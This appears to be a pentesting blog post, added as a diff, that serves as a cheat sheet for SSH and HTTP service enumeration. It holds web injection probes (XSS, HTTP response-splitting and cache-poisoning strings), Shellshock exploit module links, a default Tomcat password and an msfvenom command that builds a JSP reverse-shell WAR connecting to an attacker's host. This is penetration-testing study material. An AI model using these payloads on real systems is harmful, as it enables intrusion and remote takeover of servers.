@@ -1,0 +1,141 @@
+---
+layout: post
+title:  "Service Vulnerabilities nad Enumeration"
+categories: "Pentesting"
+tags:  windows linux pentest services vulnerability 
+author: Trelis
+---
+
+* content
+{:toc}
+
+A summary of services enumeration techniques and its vulnerabilities.
+
+
+
+
+# SSH (default port 22)
+## Information Gathering
+Telnet banner grab
+```
+telnet IP 22
+```
+
+Check ssh version and ciphers used
+```
+ssh -vvv USER@IP
+```
+
+## Login 
+### Login with private key
+```
+chmod 600 deployment_key.txt
+ssh -i deployment_key.txt USER@IP
+```
+
+### Checking private key passphrase
+```
+ssh-keygen -y -f /tmp/my_key
+```
+
+## Port forwarding
+Execute the following command from the target machine. This will create a tunnel from EXTERNAL_PORT to INTERNAL_PORT in the target machine. It will open an EXTERNAL_PORT in the target machine where the attacker can connect.
+```
+ssh -L TARGET_IP:EXTERNAL_PORT:localhost:INTERNAL_PORT USER@TARGET_IP
+```
+It is possible to make the port forwarding from the attacker's machine using the flag -R instead of -L.
+
+
+## Configuration files
+* ~/.ssh/identity
+* ~/.ssh/id_dsa
+* ~/.ssh/id_rsa
+Contains the private key for authentication.  These files contain
+sensitive data and should be readable by the user but not acces-
+sible by others (read/write/execute).  ssh will simply ignore a
+private key file if it is accessible by others.  It is possible
+to specify a passphrase when generating the key which will be
+used to encrypt the sensitive part of this file using 3DES.
+* ~/.ssh/identity.pub
+* ~/.ssh/id_dsa.pub
+* ~/.ssh/id_rsa.pub
+Contains the public key for authentication.  These files are not
+sensitive and can (but need not) be readable by anyone.
+* ~/.ssh/authorized_keys
+Lists the public keys (RSA/DSA) that can be used for logging in
+as this user.  The format of this file is described in the
+sshd(8) manual page.  This file is not highly sensitive, but the
+recommended permissions are read/write for the user, and not
+accessible by others.
+
+## SSH Client programs
+* tunnelier
+* winsshd
+* putty
+* winscp 
+
+
+
+# HTTP/HTTPS (default port 80/443)
+## Backdoors
+[PentestMonkey Cheat Sheet][http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet]
+
+## Input validation checks
+```
+NULL or null
+    Possible error messages returned.
+' , " , ; , <!
+    Breaks an SQL string or query; used for SQL, XPath and XML Injection tests.
+– , = , + , "
+    Used to craft SQL Injection queries.
+‘ , &, ! , ¦ , < , >
+    Used to find command execution vulnerabilities.
+"><script>alert(1)</script>
+    Basic Cross-Site Scripting Checks.
+%0d%0a
+    Carriage Return (%0d) Line Feed (%0a)
+        HTTP Splitting
+
+            language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
+                i.e. Content-Length= 0 HTTP/1.1 200 OK Content-Type=text/html Content-Length=47<html>blah</html>
+        Cache Poisoning
+
+            language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20304%20Not%20Modified%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a<html>Insert undesireable content here</html>
+%7f , %ff
+    byte-length overflows; maximum 7- and 8-bit values.
+-1, other
+    Integer and underflow vulnerabilities.
+%n , %x , %s
+    Testing for format string vulnerabilities.
+../
+    Directory Traversal Vulnerabilities.
+% , _, *
+    Wildcard characters can sometimes present DoS issues or information disclosure.
+Ax1024+
+    Overflow vulnerabilities.
+```
+
+## cgi-bin
+### Eenummeration:
+* [Metasploit: scanner/http/apache_mod_cgi_bash_env][https://www.rapid7.com/db/modules/auxiliary/scanner/http/apache_mod_cgi_bash_env]
+* [Nmap: http-shellshock][https://nmap.org/nsedoc/scripts/http-shellshock.html]
+
+### Exploiting:
+* [Metasploit: multi/http/apache_mod_cgi_bash_env_exec][https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec]
+
+## Tomcat
+###Default passwords
+* User: tomcat
+* Pass: s3cret
+
+### WAR files
+These files are simply zipped files   using the java jar tool. These files are   created for different purposes. Here   is the description of these files:
+• .jar files: The .jar files contain   libraries, resources and   accessories files like property files.
+•  .war files:  The war file contains   the web application that can be   deployed on any servlet/jsp   container. The .war file contains jsp,   html, javascript and other files   necessary for the development of web   applications.
+
+There are special files and directories within a WAR file: 
+• The /WEB-INF directory in the WAR file contains a file named  which defines the structure of the web application. If the web application is only serving JSP files, the web.xml file is not strictly necessary. If the web application uses servlets, then the servlet container uses web.xml to ascertain to which  a  request will be routed. The web.xml file is also used to define context variables which can be referenced within the servlets and it is used to define environmental dependencies which the deployer is expected to set up. An example of this is a dependency on a mail session used to send email. The servlet container is responsible for providing this service.
+
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+```
